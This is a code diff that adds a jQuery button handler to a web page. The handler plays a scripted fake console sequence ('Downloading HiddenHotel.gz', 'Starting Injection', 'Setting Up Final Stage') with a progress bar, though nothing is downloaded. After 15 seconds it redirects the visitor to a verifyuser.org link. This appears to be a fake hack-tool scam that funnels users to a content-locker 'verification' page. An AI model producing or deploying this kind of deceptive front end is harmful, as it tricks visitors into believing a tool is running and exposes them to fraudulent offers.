@@ -940,6 +940,62 @@ $(document).ready(function() {
 			window.location.href="https://verifyuser.org/cl/i/6dplvj";
 		}, 15000);
 	});	
+		$('.start17-button').click(function() {
+		$(".message-content p.console-message").hide();
+		$.magnificPopup.open({
+			items: {
+				src: '#message-wrapper',
+			},
+			type: 'inline',
+			preloader: false,
+			modal: true,
+			mainClass: 'mfp-fade'
+		});
+		progressBar(0, $('#progressBarConsole'));
+		$(".message-content p.console-message").fadeIn();
+		setTimeout(function() {
+			$(".console-loadbar").fadeIn();
+			$(".message-content p.console-message").typed({
+				strings: ["Downloading HiddenHotel.gz"],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(20, $('#progressBarConsole'));
+				}
+			});
+		}, 200);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Unpacking HiddenHotel.gz"],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(40, $('#progressBarConsole'));
+				}
+			});
+		}, 5000);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Starting Injection"],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(60, $('#progressBarConsole'));
+				}
+			});
+		}, 10000);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Setting Up Final Stage"],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(80, $('#progressBarConsole'));
+				}
+			});
+			window.location.href="https://verifyuser.org/cl/i/e6l4wq";
+		}, 15000);
+	});	
 	
 	
 	
